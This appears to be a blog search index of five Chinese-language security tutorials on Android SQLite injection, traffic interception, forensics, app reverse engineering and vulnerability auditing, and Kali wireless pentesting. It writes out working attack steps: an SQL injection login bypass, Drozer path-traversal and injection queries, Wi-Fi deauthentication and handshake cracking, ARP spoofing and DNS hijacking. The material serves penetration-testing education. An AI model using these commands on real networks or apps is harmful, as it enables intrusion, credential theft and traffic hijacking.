<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[深入理解SQLite]]></title>
    <url>%2F2019%2F04%2F17%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3SQLite%2F</url>
    <content type="text"><![CDATA[SQLite是一款开源数据库，Android选择SQLite的原因是其内存占用较低。 深入理解SQLiteSQLite数据库在Android中默认存储在/data/data/[package name]/databases/位置，文件扩展名为.db。 分析使用SQLite的简单应用 运行应用程序，使其创建SQLite数据库。 使用adb shell访问数据库，可以使用SQLite浏览器访问SQLite文件，也可以使用命令sqlite3进行管理。 SQLite数据库文件格式一般为.db，.sqlite，.sqlitedb或开发人员指定的其他扩展名。 使用命令sqlite3打开数据库，然后就可以使用sql命令对数据库进行操作，使用.help查看命令帮助。 1sqlite3 [dbname] .databases：列出数据库名称。.tables：列出数据库包含的表名称。.schema：查看表。 使用.output命令将SQL查询输出自动保存至指定文件，方便后续将文件拉取到本地，如果设置.output stdout，查询输出将在终端打印结果并保存至文件。.dump命令将创建一个列表，该列表包含从数据库创建到现在所执行的全部SQL操作。 另外，使用adb shell可以直接在本地对数据库进行操作。 1$ adb shell sqlite3 -column -header /data/data/[package_name]/databases/[db_name] 'select * from [table_name]' 安全漏洞跟WEB应用类似，Android应用程序中最常见的漏洞之一也是注入类漏洞。一般应用程序查询数据构造的SQL查询语句如下所示：123String getSQL = "SELECT * FROM " + tableName + "WHERE " + username + " = '" + uname + "' AND " + password + " = '" + pword + "'";Cursor cursor = dataBase.rawQuery(getSQL,null) 以上SQL查询用于验证用户登录凭证，然后显示其注册填写的信息，如果验证通过则返回布尔值TRUE。该SQL查询中uname和pword字段从用户输入直接传递到SQL语句，然后使用rawQuery方法执行，rawQuery方法会执行传递过来的任何SQL查询，类似的方法还有execSQL。 由于SQL查询未对用户端输入进行任何校验，如果用户端提交了不正常的输入，如密码框输入pword&#39; or &#39;1&#39;=&#39;1，从而使SQL查询结果始终为真，该用户将无需正确密码完成登录。同样的，SQLite可以使用--对后面部分进行注释。 1SELECT * FROM USER_RECORDS WHERE USERNAME = 'uname' AND PASSWORD = 'pword' or '1'='1' Drozer利用SQLite注入漏洞 启动Drozer连接SQLite数据库。 123adb forward tcp:31415 tcp:31415drozer console connect 在Drozer控制台使用finduri扫描器模块查看所有内容URI和可访问的URI。 1dz&gt; run scanner.provider.finduris -a [package_name] 3.使用Drozer中的注入扫描程序模块检查应用程序中的注入漏洞。 1dz&gt; run scanner.provider.injection -a [package_name] 使用参数查询这些内容供应器，如1 = 1将永远为TRUE。 1dz&gt; run app.provider.query [injection_uri] --selection "1=1" 还可以使用Drozer的app.provider.insert模块将数据插入数据库表。 1dz&gt; run app.provider.insert [injection_uri] --integer _id 1 --string column "string" 执行完成将输出Done.。]]></content>
      <categories>
        <category>Android安全</category>
      </categories>
      <tags>
        <tag>Android安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android流量分析和取证]]></title>
    <url>%2F2019%2F04%2F10%2FAndroid%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%92%8C%E5%8F%96%E8%AF%81%2F</url>
    <content type="text"><![CDATA[应用程序通常会在网络数据中泄漏敏感信息，也会经常遇到使用不安全网络协议进行身份验证和会话管理的应用程序。因此，安全流量分析是Android渗透测试过程中重要一环。 Android流量分析方式Android流量分析分为主动分析和被动分析，区别如下： 被动分析：在被动分析中，应用程序发送的网络流量不会被拦截，攻击者通过嗅探工具嗅探所有流量包，并用分析器分析其中可能泄漏的敏感数据或安全漏洞。 主动分析：在主动分析中，攻击者主动拦截所有正在进行的网络通信，并对数据包进行分析、评估或修改。该过程需要设置代理，通过应用和设备的所有网络流量全部通过该代理程序。 被动分析下载tcpdump-arm二进制文件https://www.androidtcpdump.com/android-tcpdump/downloads，然后使用adb的push命令将二进制文件推送到Android的/data/local/tmp目录。同样的，需要从设备中拉取内容的情况下可以使用pull命令。 1$ adb push tcpdump /data/local/tmp/tcpdump 使用chmod命令对tcpdump授予执行权限 1# chmod 777 /data/local/tmp/tcpdump 运行tcpdump并将抓取的数据包输出到.pcap文件。 1# ./tcpdump -v -s 0 -w output.pcap -s：从每个封包抽取给定字节的数据，默认65535字节。-v：输出详细数据。-w：写入原始数据包的文件名。 在抓包过程中，使用手机浏览器访问互联网，tcpdump会抓取该过程网络流量。抓包完成后使用adb pull命令拉取抓到的流量文件。 1$ adb pull /data/local/tmp/output.pcap output.pcap 如果提示需要修改output.pcap文件权限才能拉取，使用chmod 666 output.pcap修改后拉取。最后使用wireshark对数据包进行分析。 主动分析HTTP流量拦截：以命令行方式启动可读写权限，并设置代理。 1$ emulator -avd [avd_name] -http-proxy 127.0.0.1:8080 -writable-system 然后启动Burpsuite并配置好本地代理，模拟器产生的所有网络流量就能够全部抓取到。 HTTPS流量拦截：对于HTTPS流量的代理设置需要安装Burpsuite CA证书。首先在本地http://burp下载CA证书cacert.der，导入本地浏览器后导出PortSwiggerCA.crt证书文件。然后使用命令push到模拟器中。 1$ adb push PortSwiggerCA.crt /mnt/sdcard/PortSwiggerCA.crt 最后到模拟器中从SD卡安装证书，完成安装就可以使用Burpsuite抓取HTTPS流量。 Genymotion模拟器流量拦截：Genymotion模拟器代理配置有点坑，摸索好长时间发现只能通过模拟器里WIFI高级代理设置，然后在Burpsuite中设置相同IP地址的代理IP。 HTTPS流量拦截配置同样需要安装CA证书即可。另外可以尝试fiddler和charles抓包分析。 应用程序流量安全防护需要保证HTTPS协议的安全连接，并配置安全证书。这种场景中对HTTPS流量拦截需要分析应用程序验证证书的方式，甚至需要对程序进行逆向、修改和重新编译。 Android取证取证是使用自动或手动方式从设备中提取和分析数据的过程，大致分为逻辑采集和物理采集。 逻辑采集：取证人员与设备交互并从文件系统中提取数据，数据涉及通讯录、信息、通话记录、浏览器历史、各类应用数据等任何内容。优点是大多数情况下比物理采集更容易获取逻辑信息，但存在数据被篡改的风险。 物理采集：该取证方式需要对物理存储介质进行逐位拷贝，该方法耗时长，但更可靠。 Android文件系统的主分区通常为YAFFS2(Yet Another Flash File System 2)，YAFFS是由Aleph One公司所发展出来的NAND flash 嵌入式文件系统，为设备提供了更高的效率和性能，以及更低的占用空间。 使用adb shell进入shell命令行，查看/proc/mtd或/proc/partitions文件可查看Android设备分区情况。Android系统一般包括system，cache，data，boot等，同样可以使用mount命令查看已挂载分区和类型。 使用dd提取数据取证过程一般要求不能直接对取证设备进行操作，linux下dd工具可以完整复制取证系统且不做任何修改。 1.使用cat /proc/mtd或cat /proc/partitions查找目标分区。2.使用dd命令将目标分区复制到/mnt/sdcard中。 1$ dd if=[源文件] of=[目标文件] count=1 bs=512 3.等待操作完成，使用adb pull命令将复制的分区文件拉取到本地。 1$ adb pull /mnt/sdcard/data.img data.img 4.另外可以使用Netcat将映像直接保存到远程系统，需要将端口从设备转发到系统，并使用Netcat监听5566端口，然后进入adb shell使用dd工具将输出转发到Netcat。 12345adb forward tcp:5566 tcp:5566nc 127.0.0.1 5566 &gt; data.imgnc -l -p 5566 -e dd if=[源文件] 使用Andriller提取数据Andriller是用python编写的开源多平台取证工具，该工具有助于从设备中提取一些基本信息并进行取证分析，并生成HTML取证报告。Andriller下载地址：https://www.andriller.com/download/ 使用AFLogical提取联系人、通话记录和短信AFLogical是一款开源Android取证框架，可以从设备创建逻辑采集并将结果呈现给取证人员，包括提取联系人、通话记录和短信等关键组件。AFLogical下载地址：https://github.com/nowsecure/android-forensics，将下载的.apk文件安装到模拟器并运行，选择需要提取的信息，然后单击Capture，AFLogical会将选择的信息提取保存到SD卡的csv文件中。完成后就可以使用adb pull命令将提取的csv文件拉取到本地。 手动转储应用的数据库在某些情况下，需要使用手动方式从设备中提取一些信息，由于应用程序大多使用数据库存储数据，如应用程序目录/data/data/com.android.xxx/databases文件夹。Android大部分使用SQLite数据库和.db文件格式，可以安装以下步骤手动提取数据库文件。 进入取证设备目录，并创建一个文件夹存储提取的数据库文件。 1$ mkdir /mnt/sdcard/DBBack 查找所有.db文件并复制到创建的文件夹中。 1$ find . -name "*.db" -type f -exec cp &#123;&#125; /mnt/sdcard/DBBack \; 使用tar或zip将文件夹压缩并使用adb pull目录拉取到本地系统。 123$ tar cvf dbback.tar DBBack/$ adb pull /mnt/sdcard/dbback.tar dbback.tar 将文件拉取到本地后，解压文件即可对数据库文件进行分析。分析SQLite数据库文件可以使用SQLite数据库浏览器,下载地址：https://github.com/sqlitebrowser/sqlitebrowser。 使用logcat记录日志在某些情况下，Android logcat可以辅助取证过程，可以收集包括电话及录音机上执行的操作日志。使用adb logcat捕获保存logcat转储文件并输出到指定文件，以供后续分析。 1$ adb logcat &gt; logcat_dump.log logcat还可以设置其他参数收集特定内容的日志：-b：显示缓冲区（如radio收音机）的logcat。-v：控制输出格式，如verbose，time，tag，等。-d：调试。 1$ adb logcat -v time -b radio -d 另外可以使用dmesg打印内核消息，使用getprop打印设备属性adb shell getprop。 使用备份功能提取应用数据Android 4.0开始引入adb备份功能，用于创建应用程序备份及完整数据，此功能可用于取证过程捕获全部数据。 使用pm list查找目标应用程序包。 1$ adb shell pm list package -f chrome 使用adb backup备份目标应用程序，备份文件为.ab格式。 1$ adb backup [package_name] -f [target_file].ab 运行命令之后需要到模拟器设备上进行确认操作，并选择设置密码。然后使用dd和openssl创建.tar压缩文件。 1$ dd if=[target_file].ab bs=24 skip=1 | openssl zlib -d &gt; [file].tar 然后就可以解压文件分析数据库.db文件。]]></content>
      <categories>
        <category>Android安全</category>
      </categories>
      <tags>
        <tag>Android安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android逆向及安全漏洞审计]]></title>
    <url>%2F2019%2F04%2F09%2FAndroid%E9%80%86%E5%90%91%E5%8F%8A%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[Android应用程序文件结构apk程序文件结构一般.apk程序包括以下文件和文件夹： Classes.dex （文件） AndroidManifest.xml （文件） META-INF （文件夹） resources.arsc （文件） res （文件夹） assets （文件夹） lib （文件夹） Android 应用程序组件Android 应用程序由各种组件组成，它们一起创建可工作的应用程序。 这些组件是活动，服务，广播接收器，内容供应器和共享首选项。 活动（Activity）：用户可以与之交互的可视界面。包括按钮，图像，TextView或任何其他可视组件。 服务（Service）：这些 Android 组件在后台运行，并执行开发人员指定的特定任务。这些任务包括从 HTTP 下载文件到在后台播放音乐等任何内容。 广播接收器（Broadcast Receiver）： Android 应用程序中的接收器，通过 Android 系统或设备中存在的其他应用程序，监听传入的广播消息。一旦它们接收到广播消息，就可以根据预定义的条件触发特定动作。条件可以为收到 SMS，来电呼叫，电量改变等等。 共享首选项（Shared Preference）：应用程序使用这些首选项，以便为应用程序保存小型数据集。此数据存储在名为shared_prefs的文件夹中。这些小数据集可以包括名值对，例如游戏中的用户得分和登录凭证。不建议在共享首选项中存储敏感信息，因为它们可能易受数据窃取和泄漏的影响。 意图（Intent）：这些组件用于将两个或多个不同的 Android 组件绑定在一起。意图可以用于执行各种任务，例如启动动作，切换活动和启动服务。 内容供应器（Content Provider）：这些组件用于访问应用程序使用的结构化数据集。应用程序可以使用内容供应器访问和查询自己的数据或存储在手机中的数据。 Android应用程序逆向Dex2jar逆向Android应用程序dex2jar将字节码（如Classes.dex）转换为可读文件的工具，将.dex文件转换为.jar文件。.dex文件是由java字节码转换的Dalvik字节码。从cmd转到dex2jar文件夹，运行以下命令使用dex2jar工具。12$ d2j-dex2jar.bat "X:\..\abc.apk" dex2jar X:\..\abc.apk -&gt; abc-dex2jar.jar dex2jar将.apk的.dex文件转换为.jar文件后，就可以使用Java图形查看器（如JD-GUI）打开.jar文件。微信7.0.3 for Android的java源代码。 注意：如果应用程序开发人员使用一些防止反编译的保护，如 proguard 和 dex2jar，我们使用 dex2jar 或 Apktool 反编译应用程序时，不会看到准确的源代码，而是一堆不同的源文件，并不是原始源代码。 ApkTool逆向Android应用程序另一种Android逆向的方法是将.dex文件转换为smali文件，smali是一种文件格式，其语法跟Jasmine语言类似。ApkTool的优点是操作是双向的，反编译一个程序后可以使用ApkTool重新编译，且编译生成一个新的.apk文件。 ApkTool反编译apk程序 1$ apktool d [app_name].apk -d：表示反编译。如果想重新编译一个应用程序，使用-b（build）参数。 1$ apktool b [folder name] [app_name].apk 网上有另外一款Virtuous Ten Studio（VTS）工具，其功能与ApkTool类似，只是提供了UI界面方便操作，但只能在windows下运行。下载地址： 1http://www.virtuous-ten-studio.com/ Android应用安全漏洞审计由于开发人员未严格遵守安全编码规范，或开发过程中的错误代码，导致Android应用程序出现各种类型的安全漏洞，下面将学习Android漏洞的挖掘和利用。 内容供应器泄漏许多应用程序使用内容供应器来存储和查询应用程序中的数据或来自电话的数据。 除非已经定义了内容提供者可以使用权限来访问，否则任何其他应用都可以使用应用所定义的内容供应器来访问应用的数据。 所有内容供应器具有唯一的统一资源标识符（URI）以便被识别和查询。 内容提供者的 URI 的命名标准惯例是以content://开始。如果 Android API 版本低于 17，则内容供应器的默认属性是始终导出。 这意味着除非开发人员指定权限，否则任何应用程序都可以使用应用程序的内容供应器来访问和查询数据。 所有内容供应器都需要在AndroidManifest.xml中注册。 因此，我们可以对应用程序使用 Apktool，并通过查看AndroidManifest.xml文件检查内容供应器。定义内容供应器的一般方法如下所示： 1234&lt;provider android:name="com.test.example.DataProvider" android:authorities ="com.test.example.DataProvider"&gt;&lt;/provider&gt; 下面查看一个内容供应器泄漏漏洞的例子，并尝试利用该漏洞。1.使用ApkTool对应用程序反编译。2.查看定义内容供应器的AndroidManifest.xml文件，也可以使用grep命令从代码中获取内容供应器.1$ grep -R 'content://' 3.为查询内容供应器并确认漏洞是可利用的，需要在Android设备或模拟器中安装该应用程序，使用以下命令在模拟器中安装该.apk文件。123$ adb install [app_name].apkPerfirming Streamed InstallSuccess 然后可以创建一个没有任何权限的应用程序来查询存在漏洞的应用程序的内容供应器，可以使用adb查询内容供应器： 1$ adb shell content query --uri [URI of the content provider] Drozer是一款针对Android系统的安全测试框架，通过分析AndroidManifest.xml看四大组件中有无可export的，如果有就详细查看可export的组件是否真存在漏洞。下载地址：1https://labs.mwrinfosecurity.com/tools/drozer/ 安装后需要将代理组件agent.apk安装到模拟器，还需要在启动模拟器时转发一个特定端口31415建立连接。可以使用以下命令完成操作： 123$ adb install agent.apk$ adb forward tcp:31415 tcp:31415 启动drozer agent代理程序，单击”Embedded Server”&gt;”Disabled”启动服务器。 在cmd启动Drozer终端连接到模拟器：1$ drozer console connect 成功进入Drozer Console后，运行app.provider.finduri模块查找所有内容供应器。1dz&gt; run app.provider.finduri [URI of the content provider] 使用app.provider.query模块查询内容供应器URI，如果能够查询到来自内容供应器的数据，意味着内容供应器泄漏数据且存在漏洞，因为Drozer未被明确授予使用数据集的任何权限。 漏洞修复建议：在创建内容供应器时指定参数android:exported = false，或创建一些新的权限，其他程序在访问供应器之前必须请求它。 不安全的文件存储开发人员对应用程序存储数据时未指定文件的正确操作权限，这些文件有时会被标记成全局可读，其他程序访问不需要请求权限，导致文件不安全存储问题。按照以下步骤对该漏洞进行检测：1.通过adb shell使用cd命令进入/data/data/[app_name]。2.使用find命令搜索特定权限的文件。1# find /data/data/ -perm [permossions value] 使用cat和grep等命令可查看文件存储的信息，如：密码，等。 漏洞修复建议：开发人员设置正确的文件操作权限，对密码等敏感数据使用加密等手段处理。 目录遍历或本地文件包含漏洞应用程序中的目录遍历漏洞允许攻击者使用漏洞读取其他系统文件，该漏洞可使用Drozer进行检测。 通过分析Adobe Reader 10.3.1版本中存在的目录遍历漏洞，可以清晰地理解该漏洞利用方法。1.使用adb install adobe_reader_x_10.3.1_64606.apk安装.apk程序。2.启动Drozer，使用app.provider.finduri模块查找内容供应器URI。1234dz&gt; run app.provider.finduri com.adobe.readerScanning com.adobe.reader...content://com.adobe.reader.fileprovider/content://com.adobe.reader.fileprovider 3.使用app.provider.read利用查找到的URI，如尝试读取/proc/cpuinfo文件内容，该文件默认存在所有Android实例中。1dz&gt; run app.provider.read content://com.adobe.reader.fileprovider/../../../../proc/cpuinfo SQL注入SQL注入与WEB端类似，都是因为开发人员未对用户输入和服务器端输出进行严格检查，Android使用的是SQLite数据库。对SQL注入漏洞的利用，除与WEB端SQL注入漏洞类型利用方法外，还可以使用Drozer的app.provider.query模块利用SQL注入漏洞。 1dz&gt; run app.provider.query [Content Provider URI] --projection "* FROM SQLITE_MASTER WHERE type='table';- -" 上述命令将返回SQLite数据库中全部表的列表，SQLITE_MASTER中保存数据库的基本信息。 OWASP Mobile TOP 10 脆弱的服务器端安全控制 OWASP排名第一的漏洞“脆弱的服务器端安全控制”，就是没有以一个安全的方式从移动应用程序向服务器端发送数据，或在发送数据时暴露了某些敏感API。如：考虑对一个Android应用程序登录服务器的凭据进行身份验证，未对用户输入进行验证，可能被攻击者利用修改凭证来获得服务器敏感或未授权的区域。这是移动端和WEB端都存在的漏洞类型。 不安全的数据存储 即在设备上存储任意用户都能够访问的与应用程序相关的信息。许多Android应用在shared preferences、SQLite（明文形式）或外部存储器存储用户敏感信息或应用程序信息。 传输层保护不足 许多Android开发者使用了不安全方式进行数据传输，如HTTP协议，或未正确实现SSL，这使得程序容易受到各种类型攻击，如从应用向服务器发送数据时进行数据包拦截，参数操作，修改响应数据，以便获得应用锁定区域的访问权限。 意外的数据泄露 此漏洞是由于应用程序本身存储数据位置是脆弱的，如：剪切板、URL缓存、浏览器cookies、HTML5数据存储，等。 弱授权和身份认证 一个Android应用程序，如果试图在没有适当安全措施的情况下通过客户端检测进行用户验证或授权，那么就是存在风险的。应当指出的是，手机root后大多数客户端保护都是可以绕过的，因此建议开发人员使用适当的检测方法在服务器端进行身份验证和授权，并在移动端使用一个随机生成的令牌验证用户。 密码破解 使用不安全的加密函数加密数据组件，包括某些已知不安全加密算法，如MD5、SHA1、RC2等。 客户端注入 run app.provider.query [Content Provider URI] –projection “* FROM SQLITE_MASTER WHERE type=’table’;- -“ 通过不可信输入进行安全决策 在移动应用程序中，开发人员应该清洗和检查用户输入或其他相关输入，不可信输入可能导致应用中其他安全风险，如客户端注入。 Session会话处理不当 在对一个应用程序的session进行处理时，开发人员需要关注很多因素，如合适的过期身份验证cookie，安全令牌创建，cookie生成和旋转，后台无效session等。在web应用和Android应用程序之间必须保存一个适当的安全同步。 缺乏二进制文件保护 不能有效阻止应用程序被逆向或反编译。apktool、dex2jar等工具对Android进行逆向，从而导致各种安全风险，为防止应用被逆向，开发人员可以使用proguardand和dasho等对应用进行加固。]]></content>
      <categories>
        <category>Android安全</category>
      </categories>
      <tags>
        <tag>Android安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android安全基础及环境配置]]></title>
    <url>%2F2019%2F04%2F06%2FAndroid%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%8F%8A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[Android安全基础Dalvik虚拟机（DVM）；Android4.4版本之后，Android运行时（ART）。Android安全模型的核心是Linux特权分离。与Linux类似，用作命令的二进制文件位于/system/bin和/system/xbin；安装的应用程序位于/data/data；原始安装文件（.apk）存储在/data/app；从Play商店购买的应用程序存储在/data/app-private/。 Android虚拟环境配置Android Studio下载地址1https://developer.android.com/studio 汉化文件下载将汉化文件复制到X:\Android\Android Studio\lib\，重启生效。 Genymotion下载地址1https://www.genymotion.com/download/ 下载需要登录，分为包含virtualbox和不包含virtualbox两个版本。 Android Studio关联GenymotionAndroid Studio的File&gt;Setting&gt;Plugins&gt;Browse repositories，搜索Genymotion并安装，重启后生效。在工具栏出现Genymotion图标（如果找不到，打开视图勾选工具栏），点击提示关联Genymotion路径。 渗透测试实用工具Android Debug BridgeAndroid Debug Bridge 是一个客户端 - 服务器程序，允许用户与模拟器器或连接的 Android 设备交互。 它包括客户端（在系统上运行），处理通信的服务器（也在系统上运行）以及作为后台进程在模拟器和设备上上运行的守护程序。 客户端用于 ADB 通信的默认端口始终是 5037，设备使用从 5555 到 5585 的端口。使用cmd运行adb devices命令与已启动的模拟器交互。 使用pm包管理器获取已安装的软件包列表 1$ adb shell pm list packages 使用dumpsys meminfo获取全部应用程序及当前内存占用列表 1$ adb shell dumpsys meminfo 使用logcat（读取Android设备事件日志的工具），并保存到指定文件 1$ adb logcat -d -f /data/local/logcats.log Android SDK中的MonkeyRunner工具用于自动化和测试Android应用程序，甚至与应用程序交互。如，为了使用10个自动化触摸，敲击和事件来测试应用程序，可以在adb shell中使用monkey 10命令 1$ monkey 10 Burp SuiteBurp Suite配置好之后，使用以下命令使用代理。 1$ emulator -avd [name of the avd] -http-proxy 127.0.0.1:8080 ApkToolApkTool下载 将下载的文件解压保存在任一目录，并配置path环境变量，就可以在cmd中使用apktool命令。 Dex2jar下载地址1https://code.google.com/p/dex2jar/ Dex2jar下载 JD-GUI下载地址1http://jd.benow.ca/ JD-GUI下载]]></content>
      <categories>
        <category>Android安全</category>
      </categories>
      <tags>
        <tag>Android安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Linux无线渗透初探]]></title>
    <url>%2F2019%2F04%2F06%2FKali%20Linux%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%88%9D%E6%8E%A2%2F</url>
    <content type="text"><![CDATA[新购入无线网卡一枚，用于学习kali linux下的无线渗透内容。前期准备工作不多赘述，直接进入实操实战阶段。 前期渗透启用无线网卡1$ ifconfig wlan0 up 开启网卡监听模式1$ airmon-ng start wlan0 输入ifconfig命令查看网卡名称变为wlan0mon；输入iwconfig命令确认mode为monitor模式。 扫描附近wifi热点1$ airodump-ng wlan0mon BSSID是路由器MAC地址，CH是无线信道。 对目标路由器进行抓包1$ airodump-ng -c 1 --bssid ff:ff:ff:ff:ff:ff -w cap wlan0mon -c：信道–bssid：路由器MAC地址-w：指定抓到的包存放文件 此时可查看路由器接入的设备MAC地址，但是无法抓取设备发送到路由器的密码认证数据包，需要将目标设备踢下线自动重连，抓取认证握手包。 将目标设备踢下线1$ aireplay-ng -0 10 -a ff:ff:ff:ff:ff:ff -c 00:00:00:00:00:00 wlan0mon -0：发送n条认证消息-a：路由器MAC地址-c：目标设备MAC地址 看到[WPA handshark:]代表成功抓取认证握手数据包。保存的文件目录中有cap-01.cap文件，通过爆破方式可解密认证密码。 密码爆破1$ aircrack-ng cap-01.cap -w password.txt 内网漫游接下来要对目标设备进行进一步攻击，如ARP欺骗、DNS劫持，等。 关闭网卡监听模式1$ airmon-ng stop wlan0mon 用爆破得到的密码连入目标无线网络，查看获取的IP地址，可推断出网关地址。 用nmap扫描内网就可获取已接入的主机信息。 nmap扫描主机1$ nmap -sP 192.168.1.1/24 选择一台目标靶机，并开启流量转发功能，使靶机流量先经过kali再到路由器。 流量转发1$ echo 1 &gt; /proc/sys/net/ipv4/ip_forward 然后cat /proc/sys/net/ipv4/ip_forward，如果返回1代表流量转发成功。 对靶机进行ARP欺骗1$ arpspoof -i wlan0 -t 192.168.1.3 -r 192.168.1.1 -i：网卡名称-t：目标靶机IP地址-r：网关IP地址 此时已成功完成中间人攻击，可获取靶机到路由器的全部流量信息，可使用其他工具分析流量信息。 使用driftnet监听浏览的图片1$ driftnet -i wlan0 使用wireshark分析包内容，或抓取账号密码1$ wireshark &amp; DNS劫持首先添加一条解析 1$ vi /etc/ettercap/etter.dns 例：www.google.com A 1.1.1.1 然后打开ettercap，[sniff]&gt;[Unified sniffing]，选择wlan0网卡，[Plugins]&gt;[Manage the plugins]，双击dns_spoof模块，最后[start]&gt;[start sniffing]。此时靶机打开google会解析到1.1.1.1，成功完成DNS劫持。 以上攻击时建立在http协议上，对于https协议，可使用sslstrip对https进行降级，但会导致浏览器提示证书报错，对https协议攻击会另写一篇进行说明。]]></content>
      <categories>
        <category>无线网络渗透</category>
      </categories>
      <tags>
        <tag>无线渗透测试</tag>
      </tags>
  </entry>
</search>
